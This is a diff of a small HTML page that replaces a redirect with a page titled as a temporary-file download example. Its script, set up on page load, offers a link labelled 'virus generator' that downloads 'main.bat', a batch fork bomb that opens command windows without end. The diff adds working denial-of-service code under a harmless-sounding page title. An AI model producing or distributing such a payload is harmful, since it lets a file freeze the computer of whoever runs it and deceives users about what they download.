@@ -1,14 +1,37 @@
 <!DOCTYPE html>
 <html lang="zh">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading......</title>
-<script language="javascript" type="text/javascript">
-window.location.href="https://zhouhangshan.github.io/Jay/3";
-</script>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Download Temporary File Example</title>
 </head>
-<body style="margin:0;background-color:black">
-<h1>Loading...</h1>
+<body>
+
+<!-- 创建一个下载链接 -->
+<a href="#" id="download-link">病毒生成器</a>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  var content = ":start\nstart cmd\ngoto start"; // 这里是文件的内容，可以是任何字符串或者Blob对象
+  
+  // 创建一个Blob对象，这里示例使用纯文本
+  var blob = new Blob([content], { type: 'text/plain' });
+
+  // 创建一个临时URL，用于文件下载
+  var url = URL.createObjectURL(blob);
+
+  // 获取下载链接元素
+  var downloadLink = document.getElementById('download-link');
+
+  // 设置下载链接的href属性为临时URL，设置download属性为文件名（可选）
+  downloadLink.href = url;
+  downloadLink.download = 'main.bat'; // 这里可以设置文件名
+
+  // 可选：当不再需要临时URL时，释放它以节省内存
+  // 注意：浏览器会在下载完成后自动释放临时URL
+  // URL.revokeObjectURL(url);
+});
+</script>
+
 </body>
 </html>
